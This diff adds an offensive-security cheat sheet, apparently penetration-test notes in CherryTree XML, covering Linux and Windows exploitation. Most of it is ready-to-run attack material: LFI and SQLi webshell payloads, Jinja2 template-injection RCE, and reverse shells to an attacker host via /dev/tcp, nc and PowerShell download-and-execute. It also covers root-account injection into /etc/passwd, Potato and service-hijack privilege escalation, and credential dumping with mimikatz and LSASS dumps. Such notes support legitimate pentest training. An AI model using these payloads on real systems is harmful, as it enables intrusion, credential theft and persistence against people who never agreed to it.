@@ -1,0 +1,579 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <node name="Offensive Security" tags="" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
+    <rich_text></rich_text>
+
+    <node name="03. Linux Exploitation" tags="" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
+      <rich_text></rich_text>
+
+      <node name="Initial Access Decision Tree" tags="" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
+        <rich_text>NMAP OUTPUT ANALYSIS
+│
+├── Web Port (80/443/8080)?
+│   ├── Directory enum → /admin, /backup, /upload, /dev found?
+│   ├── CMS? → WPScan/Joomscan → plugin CVE / auth bypass
+│   ├── Login page? → default creds, SQLi, brute force
+│   ├── File upload? → bypass constraints → webshell
+│   ├── LFI/RFI? → log poisoning or wrapper execution → RCE
+│   ├── SSTI? → Jinja2/Twig structural sandbox breakout → RCE
+│   ├── SQLi? → arbitrary system file write → webshell
+│   ├── Command injection in params? Chaining characters (;, |, `)
+│   └── Version-specific CVE? → searchsploit / public PoC tracking
+│
+├── FTP (21)?
+│   ├── Anonymous login → identify writable directories overlapping with webroot
+│   └── Upload PHP shell → trigger execution via web browser navigation
+│
+├── SSH (22)? → Need creds; prioritize passive extraction and credential hunting on other services
+│
+├── NFS (111/2049)?
+│   └── showmount -e → mount exported share → check for .ssh files, hardcoded creds, writable paths
+│
+└── SNMP (161 UDP)?
+     └── community string validation → dump infrastructure parameters → extract credentials/usernames
+</rich_text>
+      </node>
+
+      <node name="Web Attack Techniques" tags="" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
+        <rich_text>http://&lt;TARGET_IP&gt;/page.php?file=../../../../etc/passwd
+# LFI: Arbitrary file system traversal verification
+--------------------------------------------------
+http://&lt;TARGET_IP&gt;/page.php?file=../../../../etc/shadow
+# LFI: Test for misconfigured file permissions
+--------------------------------------------------
+http://&lt;TARGET_IP&gt;/page.php?file=/proc/self/environ
+# LFI: Extract in-memory environment properties
+--------------------------------------------------
+http://&lt;TARGET_IP&gt;/page.php?file=php://filter/convert.base64-encode/resource=config.php
+# LFI: Base64 decoded PHP filter source code disclosure
+--------------------------------------------------
+http://&lt;TARGET_IP&gt;/page.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
+# LFI: Execution of arbitrary in-memory PHP payload wrappers
+--------------------------------------------------
+curl -A '&lt;?php system($_GET["cmd"]); ?&gt;' http://&lt;TARGET_IP&gt;/
+# Log Poisoning: Inject code into Apache/Nginx User-Agent field
+--------------------------------------------------
+http://&lt;TARGET_IP&gt;/page.php?file=/var/log/apache2/access.log&amp;cmd=id
+# Log Poisoning: Execute weaponized local web access log
+--------------------------------------------------
+ssh '&lt;?php system($_GET["cmd"]); ?&gt;'@&lt;TARGET_IP&gt;
+# Log Poisoning: SSH authentication error streams injection
+--------------------------------------------------
+http://&lt;TARGET_IP&gt;/page.php?file=/var/log/auth.log&amp;cmd=whoami
+# Log Poisoning: Context verification for poisoned auth logs
+--------------------------------------------------
+' OR '1'='1'-- -
+# SQLi: Authentication bypass core triage test
+--------------------------------------------------
+' UNION SELECT 1,load_file('/etc/passwd'),3-- -
+# SQLi: Manual union-based system file read execution
+--------------------------------------------------
+' UNION SELECT 1,"&lt;?php system($_GET['cmd']); ?&gt;",3 INTO OUTFILE '/var/www/html/cmd.php'-- -
+# SQLi: Backdoor webshell delivery via arbitrary output files
+--------------------------------------------------
+sqlmap -u "http://&lt;TARGET_IP&gt;/login.php" --data="user=admin&amp;pass=x" --level=5 --risk=3 --dbs
+# SQLi: Automated web database injection exploration
+--------------------------------------------------
+sqlmap -u "http://&lt;TARGET_IP&gt;/item?id=1" --os-shell
+# SQLi: Automated backdoor shell spawning
+--------------------------------------------------
+sqlmap -u "http://&lt;TARGET_IP&gt;/item?id=1" --file-write=/tmp/shell.php --file-dest=/var/www/html/shell.php
+# SQLi: Automated file system write manipulations
+--------------------------------------------------
+# 1. MIME type tampering: Modify header Content-Type to match image/jpeg
+# 2. Magic bytes verification prepend: Prepend GIF89a to the script header
+# 3. Double extension mapping: Execute shell.php.jpg or handle trailing breaks like shell.php%00.jpg
+# 4. Case validation shifts: Alter string into shell.pHp or write shell.PHP
+# 5. Alternative execution extensions: Swap filters with .php3, .php4, .php5, .phtml, .phar, .shtml
+# 6. Blacklist rule dropouts: Identify untracked configurations like .php7 or check .inc paths
+# 7. Injected trailing null bytes (Legacy architectures): Force processing dropouts using shell.php%00.gif
+# File Upload: Arbitrary bypass structural extensions checklist
+--------------------------------------------------
+{{7*7}}
+# SSTI: Returns 49 = Jinja2 / Twig Engine Profile
+--------------------------------------------------
+${7*7}
+# SSTI: Returns 49 = FreeMarker / Mako Architecture Match
+--------------------------------------------------
+&lt;%= 7*7 %&gt;
+# SSTI: Returns 49 = ERB (Ruby Framework Signature)
+--------------------------------------------------
+#{7*7}
+# SSTI: Returns 49 = Ruby / Structural Pebble Context
+--------------------------------------------------
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+# SSTI: Python Jinja2 engine native sandboxed RCE
+--------------------------------------------------
+{{config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i &gt;&amp; /dev/tcp/&lt;LHOST&gt;/4444 0&gt;&amp;1"').read()}}
+# SSTI: Jinja2 payload forcing reverse bash terminal ingress
+--------------------------------------------------
+{{['id']|filter('system')}}
+# SSTI: Twig server-side template engine arbitrary code injection
+--------------------------------------------------
+ping=127.0.0.1; whoami
+# Command Injection: Native operational parameter chaining (;)
+--------------------------------------------------
+ping=127.0.0.1|whoami
+# Command Injection: Native operational parameter chaining (|)
+--------------------------------------------------
+ping=127.0.0.1`whoami`
+# Command Injection: Native operational parameter chaining (`)
+--------------------------------------------------
+ping=127.0.0.1; curl http://&lt;LHOST&gt;/?x=$(id|base64)
+# Command Injection: Out-Of-Bounds (OOB) cryptographic exfiltration
+--------------------------------------------------</rich_text>
+      </node>
+
+      <node name="Privilege Escalation Checklist" tags="" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
+        <rich_text>python3 -m http.server 80
+# Attacker web delivery platform launch configuration
+--------------------------------------------------
+curl http://&lt;LHOST&gt;/linpeas.sh | bash 2&gt;/dev/null | tee /tmp/linpeas.out
+# Piping remote inbound system audit scripts to target executions
+--------------------------------------------------
+whoami &amp;&amp; id &amp;&amp; hostname
+# Active session user token &amp; machine identification configuration
+--------------------------------------------------
+uname -a &amp;&amp; cat /etc/os-release
+# Kernel environment &amp; operating distribution version verification
+--------------------------------------------------
+env | grep -i "pass\|key\|secret\|token"
+# Extracting in-memory plaintext secrets from environment arrays
+--------------------------------------------------
+cat ~/.bash_history
+# Interrogating user history trails containers for plaintext passwords
+--------------------------------------------------
+cat /home/*/.bash_history 2&gt;/dev/null
+# Interrogating all user history trails for plaintext passwords
+--------------------------------------------------
+sudo -l
+# Query authorized root sudo program mappings
+--------------------------------------------------
+sudo find . -exec /bin/bash \; -p
+# Elevated sudo interactive tool breakouts (GTFObins Find)
+--------------------------------------------------
+sudo python3 -c 'import os; os.system("/bin/bash")'
+# Elevated sudo in-memory program scripting escape (GTFObins Python)
+--------------------------------------------------
+sudo vim
+# Inside vim session execute: !/bin/bash
+# Elevated sudo local text editor workspace shell breakout (GTFObins Vim)
+--------------------------------------------------
+sudo awk 'BEGIN {system("/bin/bash")}'
+# Elevated sudo pattern parsing terminal escalation (GTFObins Awk)
+--------------------------------------------------
+sudo env /bin/bash
+# Elevated sudo environment configuration passing shell breakout
+--------------------------------------------------
+gcc -fPIC -shared -o /tmp/pe.so pe.c -nostartfiles
+sudo LD_PRELOAD=/tmp/pe.so &lt;allowed_binary&gt;
+# Compiling and weaponizing writable preloaded shared library configurations
+--------------------------------------------------
+find / -perm -4000 -type f 2&gt;/dev/null | xargs ls -la
+# Comprehensive root SUID permissions file location queries
+--------------------------------------------------
+find / -perm -2000 -type f 2&gt;/dev/null | xargs ls -la
+# Comprehensive GUID permissions file location queries
+--------------------------------------------------
+getcap -r / 2&gt;/dev/null
+# System extended file partition capability allocations search scan
+--------------------------------------------------
+cat /etc/crontab
+# Auditing automated daemon crontab schedules
+--------------------------------------------------
+ls -la /etc/cron.d/ /etc/cron.hourly/ /etc/cron.daily/
+# Auditing automated daemon cron directory schedules
+--------------------------------------------------
+crontab -l
+# Auditing current user crontab schedules
+--------------------------------------------------
+cat /var/spool/cron/crontabs/* 2&gt;/dev/null
+# Auditing all user crontab schedules
+--------------------------------------------------
+echo "" &gt; '--checkpoint=1'
+echo "" &gt; '--checkpoint-action=exec=bash shell.sh'
+echo 'bash -i &gt;&amp; /dev/tcp/&lt;LHOST&gt;/4444 0&gt;&amp;1' &gt; shell.sh
+# Weaponizing wildcard expansion traversal anomalies inside tar automations
+--------------------------------------------------
+ps aux | grep root | grep -v "\[" | grep -v "kthreadd"
+# Identifying active daemon threads bound to root contexts
+--------------------------------------------------
+ss -tlnp
+# Maps out active local-only internal services
+--------------------------------------------------
+find / -writable -not -path "/proc/*" -not -path "/sys/*" -not -path "/dev/*" -type f 2&gt;/dev/null
+# Searching system storage paths for writable file vulnerabilities
+--------------------------------------------------
+openssl passwd -1 haxpass
+# Generates MD5crypt hash string value for /etc/passwd injection
+--------------------------------------------------
+echo 'hax:$1$HASH:0:0:root:/root:/bin/bash' &gt;&gt; /etc/passwd
+# Local root account injection via writable passwd file targets
+--------------------------------------------------
+su hax
+# Authenticates locally with root context after passwd injection
+--------------------------------------------------
+cat /etc/exports
+# Auditing network file system mount point export system tables
+--------------------------------------------------
+mkdir /mnt/nfs
+mount -t nfs &lt;TARGET_IP&gt;:/share /mnt/nfs
+cp /bin/bash /mnt/nfs/
+chmod +s /mnt/nfs/bash
+# Forcing privilege escalation over shared storage units (NFS Root Squashing Hijack)
+--------------------------------------------------
+/tmp/bash -p
+# Initializing the local SUID shell partition on compromised victim terminal
+--------------------------------------------------
+id | grep -i docker
+# Confirm containerization engine group identity status mapping
+--------------------------------------------------
+groups | grep -i docker
+# Confirm containerization engine group identity status mapping (Alt)
+--------------------------------------------------
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+# Breaking container sandboxes via privilege local drive partition volumes mounting
+--------------------------------------------------
+strings /usr/local/sbin/rootscript | grep -v "/"
+# Identifying relative executable calls inside root scripts binaries
+--------------------------------------------------
+echo -e '#!/bin/bash\nbash -i &gt;&amp; /dev/tcp/&lt;LHOST&gt;/4444 0&gt;&amp;1' &gt; /tmp/service
+chmod +x /tmp/service
+export PATH=/tmp:$PATH
+# Injecting malicious local executables for path redirection privilege hijacks
+--------------------------------------------------
+find / -name "*.conf" -o -name "*.config" -o -name "*.xml" -o -name "*.ini" -o -name "*.bak" -o -name "*.old" -o -name "*.zip" -o -name "*.db" -o -name "*.kdbx" 2&gt;/dev/null | grep -v proc | grep -v sys | head -50
+# Global document tree file search extensions tracker
+--------------------------------------------------
+grep -r "password\|passwd\|pwd\|secret\|token\|key" /var/www/html/ /opt/ /home/ /etc/ 2&gt;/dev/null | grep -v ".pyc"
+# Targeted text file content regex searches for passwords
+--------------------------------------------------
+find / -name "id_rsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2&gt;/dev/null
+# Target traversal extraction for SSH cryptographic identity keys
+--------------------------------------------------
+uname -r
+# Ingress mapping of current core kernel release flags
+--------------------------------------------------
+searchsploit linux kernel $(uname -r | cut -d- -f1)
+# Programmatic local database query for public kernel exploits scripts
+--------------------------------------------------</rich_text>
+      </node>
+
+      <node name="PrivEsc Decision Tree" tags="" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
+        <rich_text>sudo -l → Any NOPASSWD entries map?
+     └── Match with GTFObins commands → ROOT ✓
+
+SUID permission binary found on storage?
+     ├── Matches standard known handler in GTFObins → ROOT ✓
+     ├── Custom in-house application binary → strings / ltrace analysis
+     └── Naked relative path execution call identified → inject path script → ROOT ✓
+
+Extended file capabilities configured?
+     └── cap_setuid present on utility → invoke local setuid(0) wrapper → ROOT ✓
+
+Writable crontab automation scripts detected?
+     └── Append custom reverse shell string or shell binary execution → ROOT ✓
+
+Insecure wildcard execution inside backups (tar/rsync)?
+     └── Inject checkpoint options into storage directory → ROOT ✓
+
+File writing permissions open on /etc/passwd?
+     └── Append custom username entry matched to uid 0 structure → ROOT ✓
+
+Network storage export configured with no_root_squash?
+     └── Mount externally + inject custom owned SUID bash binary → ROOT ✓
+
+Account maintains membership within the Docker group?
+     └── docker run -v /:/mnt → escape container via local chroot → ROOT ✓
+
+Privileged service thread bound to loopback port (ss -tlnp)?
+     └── Establish tunnel link → execute exploit payload locally → ROOT ✓
+
+All standard configurations secured? → Process specific kernel version exploit research
+</rich_text>
+      </node>
+    </node>
+
+    <node name="04. Windows Exploitation" tags="" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
+      <rich_text></rich_text>
+
+      <node name="Initial Access Decision Tree" tags="" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
+        <rich_text>NMAP OUTPUT WINDOWS
+│
+├── SMB (445)?
+│   ├── Null session bind → download directory list → inspect share configuration files
+│   ├── MS17-010 validation check → deliver EternalBlue shellcode → SYSTEM
+│   └── Valid Guest profile or credentials harvested downstream → PsExec / WMIExec execution
+│
+├── Web (80/443/8080)?
+│   ├── Follow identical directory/extension fuzzing patterns as Linux
+│   ├── IIS server target? → inspect /aspnet_client permissions, test WebDAV extensions
+│   └── Tomcat environment? → authenticate to /manager/html → drop weaponized WAR container
+│
+├── MSSQL (1433)?
+│   └── [PROCESS FULL DATABASE ESCALATION PIPELINE SEEN IN SEPARATE SECTION]
+│
+├── WinRM (5985)?
+│   └── evil-winrm -i &lt;TARGET_IP&gt; -u user -p pass (or authenticate using NT strings)
+│
+├── RDP (3389)?
+│   ├── Old host deployment check (Win7/2008) → validate BlueKeep crash state
+│   └── Account credentials available → launch desktop session via xfreerdp
+│
+└── FTP (21)?
+     └── Anonymous profiles open + write access + webroot location overlap → drop ASPX script
+</rich_text>
+      </node>
+
+      <node name="Initial Access Commands" tags="" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
+        <rich_text>nmap --script smb-vuln-ms17-010 -p 445 &lt;TARGET_IP&gt;
+# Target legacy endpoint null session vulnerability scan (MS17-010)
+--------------------------------------------------
+python3 ms17_010_shellcode.py &lt;TARGET_IP&gt;
+# Execution of manual shellcode overrides for legacy SMB targets
+--------------------------------------------------
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;LHOST&gt; LPORT=4444 -f war -o shell.war
+# Creating backdoor Tomcat manager deployment WAR payloads
+--------------------------------------------------
+curl -u admin:admin -T shell.war "http://&lt;TARGET_IP&gt;:8080/manager/text/deploy?path=/shell"
+# Delivering backdoor WAR archives through inbound HTTP put methods
+--------------------------------------------------
+curl http://&lt;TARGET_IP&gt;:8080/shell/
+# Triggering the deployed Tomcat WAR shell
+--------------------------------------------------
+davtest -url http://&lt;TARGET_IP&gt;
+# Automated scripted inspection of target WebDAV endpoints writable status
+--------------------------------------------------
+cadaver http://&lt;TARGET_IP&gt;
+# Interactive WebDAV client connection
+--------------------------------------------------
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;LHOST&gt; LPORT=4444 -f aspx -o shell.aspx
+# Generating malicious ASPX Windows architecture ingress web-shell payloads
+--------------------------------------------------
+curl -T shell.aspx http://&lt;TARGET_IP&gt;/uploads/shell.aspx
+# Uploading weaponized ASPX vectors to targets writable directories
+--------------------------------------------------
+evil-winrm -i &lt;TARGET_IP&gt; -u Administrator -p 'Password123'
+# Authenticated WinRM remote console shell access connection
+--------------------------------------------------
+evil-winrm -i &lt;TARGET_IP&gt; -u Administrator -H &lt;NTLM_HASH&gt;
+# Authenticated WinRM remote access via discovery NT hashes strings
+--------------------------------------------------</rich_text>
+      </node>
+
+      <node name="Privilege Escalation Checklist" tags="" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
+        <rich_text>python3 -m http.server 80
+# Attacker web delivery platform launch operations
+--------------------------------------------------
+powershell -c "Invoke-WebRequest http://&lt;LHOST&gt;/winPEASany.exe -OutFile C:\Windows\Temp\wp.exe"
+# Requesting remote executables downloads via PowerShell
+--------------------------------------------------
+C:\Windows\Temp\wp.exe &gt; C:\Windows\Temp\out.txt 2&gt;&amp;1
+# Executing WinPEAS and piping local output logs
+--------------------------------------------------
+type C:\Windows\Temp\out.txt
+# Reading WinPEAS output results
+--------------------------------------------------
+powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://&lt;LHOST&gt;/PowerUp.ps1'); Invoke-AllChecks"
+# Automated scripted registry, service, and system permissions ingress audit
+--------------------------------------------------
+whoami /all
+# Query account token privileges and system groups assignments registry maps
+--------------------------------------------------
+systeminfo
+# Extracting system environment blueprints, architecture, and operational metrics
+--------------------------------------------------
+wmic qfe list brief
+# Lists all installed Windows update patches
+--------------------------------------------------
+.\GodPotato-NET4.exe -cmd "cmd /c whoami &gt; C:\Windows\Temp\proof.txt"
+# Token privilege impersonation over native operating assemblies (SeImpersonate Core)
+--------------------------------------------------
+.\GodPotato-NET4.exe -cmd "cmd /c net user hax Password123! /add &amp;&amp; net localgroup administrators hax /add"
+# Injecting persistent local admin user entities via elevated impersonation handles
+--------------------------------------------------
+.\PrintSpoofer64.exe -i -c "cmd /c whoami"
+# Generating high-privilege local process call handles inside PrintSpoofer exploitations
+--------------------------------------------------
+.\PrintSpoofer64.exe -c "C:\Windows\Temp\nc.exe &lt;LHOST&gt; 4444 -e cmd"
+# Spawning reverse shell via PrintSpoofer
+--------------------------------------------------
+.\JuicyPotatoNG.exe -t * -p "C:\Windows\Temp\nc.exe" -a "&lt;LHOST&gt; 4444 -e cmd"
+# Accessing elevated SYSTEM context threads via alternative ingress frameworks
+--------------------------------------------------
+reg save HKLM\SAM C:\Temp\SAM
+# Harvesting active system account registry hive backup databases (SeBackup Vector)
+--------------------------------------------------
+reg save HKLM\SYSTEM C:\Temp\SYSTEM
+# Harvesting active system account registry hive backup databases (SeBackup Vector)
+--------------------------------------------------
+reg save HKLM\SECURITY C:\Temp\SECURITY
+# Harvesting active system account registry hive backup databases (SeBackup Vector)
+--------------------------------------------------
+secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL
+# Remote decryption of local registry hives database secrets
+--------------------------------------------------
+wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\"
+# Global querying of running processes for unquoted service paths vulnerabilities
+--------------------------------------------------
+accesschk.exe -uwcqv * /accepteula 2&gt;nul | findstr "RW\|WD"
+# Identifying weak security permissions and modification access over active services
+--------------------------------------------------
+sc stop &lt;SERVICE_NAME&gt;
+copy shell.exe "C:\path\to\service.exe"
+sc start &lt;SERVICE_NAME&gt;
+# Swapping service executables to trigger elevated backdoor shell processing
+--------------------------------------------------
+accesschk.exe -uwcqv "&lt;USERNAME&gt;" * /accepteula
+# Querying target users service manipulation permission mappings
+--------------------------------------------------
+sc config &lt;SERVICE_NAME&gt; binpath= "cmd /c net user hax Pass123! /add"
+sc stop &lt;SERVICE_NAME&gt; &amp;&amp; sc start &lt;SERVICE_NAME&gt;
+sc config &lt;SERVICE_NAME&gt; binpath= "cmd /c net localgroup administrators hax /add"
+sc stop &lt;SERVICE_NAME&gt; &amp;&amp; sc start &lt;SERVICE_NAME&gt;
+# Overriding weak service configuration paths for local admin group escalation loops
+--------------------------------------------------
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+# Auditing registry flag keys for arbitrary installer packages elevation streaks (HKLM)
+--------------------------------------------------
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+# Auditing registry flag keys for arbitrary installer packages elevation streaks (HKCU)
+--------------------------------------------------
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;LHOST&gt; LPORT=4444 -f msi -o evil.msi
+# Crafting malicious installation database packages for registry privilege exploitations
+--------------------------------------------------
+msiexec /quiet /qn /i C:\Temp\evil.msi
+# Executing backdoor installation suites silently to force elevated code operations
+--------------------------------------------------
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
+# Interrogating core current version Winlogon registries for stored passwords
+--------------------------------------------------
+reg query HKLM /f password /t REG_SZ /s 2&gt;nul | findstr /i "password"
+# Global traversal search of registry sub-keys databases for password text (HKLM)
+--------------------------------------------------
+reg query HKCU /f password /t REG_SZ /s 2&gt;nul
+# Global traversal search of registry sub-keys databases for password text (HKCU)
+--------------------------------------------------
+schtasks /query /fo LIST /v | findstr /i "run as\|task name\|next run\|program"
+# Detailed enumeration of scheduled background administrative scripts processes
+--------------------------------------------------
+cmdkey /list
+# Query vault stored security profiles credentials token collections
+--------------------------------------------------
+runas /savecred /user:&lt;DOMAIN&gt;\&lt;USER&gt; "cmd.exe /c whoami &gt; C:\Temp\w.txt"
+# Processing arbitrary command threads under saved stored runas privileges contexts
+--------------------------------------------------
+runas /savecred /user:Administrator "C:\Windows\Temp\nc.exe &lt;LHOST&gt; 4444 -e cmd"
+# Spawning reverse shell under saved stored runas privileges contexts
+--------------------------------------------------
+$env:PATH -split ";" | % { if (Test-Path $_) { (Get-Acl $_).Access } }
+# Auditing system environment PATH directories for writable access anomalies (DLL Hijacking)
+--------------------------------------------------
+type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+# Mining local console interactive session command logs for hardcoded access keys
+--------------------------------------------------
+type C:\inetpub\wwwroot\web.config
+# Tracking hardcoded database accounts passwords strings inside local app config partitions
+--------------------------------------------------
+type C:\xampp\passwords.txt
+# Tracking hardcoded database accounts passwords strings inside local app config partitions
+--------------------------------------------------
+type C:\xampp\apache\conf\httpd.conf
+# Tracking hardcoded database accounts passwords strings inside local app config partitions
+--------------------------------------------------
+dir /s /b C:\*.txt C:\*.xml C:\*.conf C:\*.config C:\*.ini 2&gt;nul | findstr /i "pass cred secret"
+# Comprehensive extension tracking keyword search across storage volumes directories
+--------------------------------------------------
+dir /s /b C:\Users\ 2&gt;nul | findstr /i "password\|creds\|credentials\|secret"
+# Comprehensive extension tracking keyword search across user directories
+--------------------------------------------------
+type C:\Windows\Panther\unattend.xml
+# Reviewing automated deployment configurations blueprint manifest files for plaintext secrets
+--------------------------------------------------
+type C:\Windows\system32\sysprep\sysprep.xml
+# Reviewing automated deployment configurations blueprint manifest files for plaintext secrets
+--------------------------------------------------
+type C:\Windows\system32\sysprep\sysprep.inf
+# Reviewing automated deployment configurations blueprint manifest files for plaintext secrets
+--------------------------------------------------</rich_text>
+      </node>
+
+      <node name="Credential Dumping" tags="" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
+        <rich_text>.\mimikatz.exe
+privilege::debug
+sekurlsa::logonpasswords
+# Interactive local memory ingestion and security support accounts hashing extractions
+--------------------------------------------------
+sekurlsa::wdigest
+# Pulls cleartext values from legacy targets
+--------------------------------------------------
+lsadump::sam
+# Decrypts local account registry databases
+--------------------------------------------------
+lsadump::lsa /patch
+# Extracts hidden core system secrets
+--------------------------------------------------
+lsadump::cache
+# Pulls domain credential cache records
+--------------------------------------------------
+sekurlsa::credman
+# Extracts cached vault profile passwords
+--------------------------------------------------
+procdump.exe -accepteula -ma lsass.exe C:\Temp\lsass.dmp
+# Evasive non-interactive target LSASS memory space dumps processes creation
+--------------------------------------------------
+pypykatz lsa minidump lsass.dmp
+# Offline parsing of process memory dumps containers for account hashes
+--------------------------------------------------
+secretsdump.py &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASS&gt;@&lt;TARGET_IP&gt;
+# Remote ingress extraction of local accounts database registries mapping via networks
+--------------------------------------------------
+secretsdump.py -hashes &lt;LM_HASH&gt;:&lt;NTLM_HASH&gt; &lt;DOMAIN&gt;/&lt;USER&gt;@&lt;TARGET_IP&gt;
+# Remote ingress extraction using Pass-The-Hash
+--------------------------------------------------
+netexec smb &lt;TARGET_IP&gt; -u user -p pass --sam
+# Remote SAM database hash extraction
+--------------------------------------------------
+netexec smb &lt;TARGET_IP&gt; -u user -p pass -M lsassy
+# Automated in-memory extraction of active session plaintext tokens
+--------------------------------------------------
+impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
+# Extracting corporate active directory network hashes database configurations
+--------------------------------------------------</rich_text>
+      </node>
+
+      <node name="PrivEsc Decision Tree" tags="" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
+        <rich_text>whoami /priv privileges check → SeImpersonatePrivilege or SeAssignPrimaryToken active?
+     └── Deploy Potato family frameworks (GodPotato / PrintSpoofer / JuicyPotatoNG) → SYSTEM ✓
+
+whoami /priv privileges check → SeBackupPrivilege active?
+     └── reg save SAM/SYSTEM/SECURITY hives → secretsdump remote processing → Pass-the-Hash → SYSTEM ✓
+
+AlwaysInstallElevated policies active within HKLM + HKCU registry profiles?
+     └── msiexec execution mapping targeting a malicious installation .msi package → SYSTEM ✓
+
+Unquoted service path discovered containing a writable intermediate path directory?
+     └── Drop custom binary payload matched to the unquoted string breakpoint → restart service → SYSTEM ✓
+
+Weak modifications rights open across service file allocations or configuration objects?
+     └── Replace binary or modify sc config path parameters → restart service → SYSTEM ✓
+
+Stored profiles cached within cmdkey vault lists?
+     └── Execute runas /savecred mapping targeting administrative user context shells → Higher privilege shell ✓
+
+Plaintext administrative auto-login variables saved inside registry strings?
+     └── Extract credentials → execute lateral verification across network targets ✓
+
+Writable automation script associated with a SYSTEM scheduled task?
+     └── Modify script content strings → trigger validation cycle manually or wait for execution → SYSTEM ✓
+
+Local PowerShell command line history files contain plain text passwords?
+     └── Extract secrets → map network parameters via Pass-the-Hash or WinRM connections ✓
+
+Secure standard configurations maintained? → Cross-reference systeminfo build hotfixes with known patch CVEs
+</rich_text>
+      </node>
+    </node>
+
+  </node>
+</cherrytree>
